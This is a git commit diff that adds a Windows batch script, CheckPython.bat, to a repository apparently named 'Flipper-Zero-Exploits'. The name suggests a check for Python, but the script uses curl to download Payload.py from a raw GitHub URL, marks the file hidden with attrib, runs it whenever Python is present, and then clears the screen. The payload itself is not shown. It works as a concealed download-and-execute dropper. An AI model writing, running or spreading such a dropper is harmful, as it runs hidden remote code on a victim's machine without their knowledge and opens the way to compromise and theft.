83d0ff3112d8dace2ef45e5f8d608870c5f59dd9
Wojtek9388 <148169378+Wojtek9388@users.noreply.github.com>
2025-01-25 14:13:47 -0800

    Update CheckPython.bat

--- Python/CheckPython.bat
+++ Python/CheckPython.bat
@@ -1,1 +1,25 @@
+@echo off
 
+curl https://raw.githubusercontent.com/Wojtek9388/Flipper-Zero-Exploits/refs/heads/main/Python/Payload.py > Payload.py
+attrib +h Payload.py
+
+:CheckPython
+    python --version > nul
+    if errorlevel 1 (
+        goto NoPython
+    )
+    goto PythonInstalled
+
+
+:PythonInstalled
+    python Payload.py
+    goto End
+
+
+:NoPython
+    exit
+
+
+:End
+    cls
+    exit
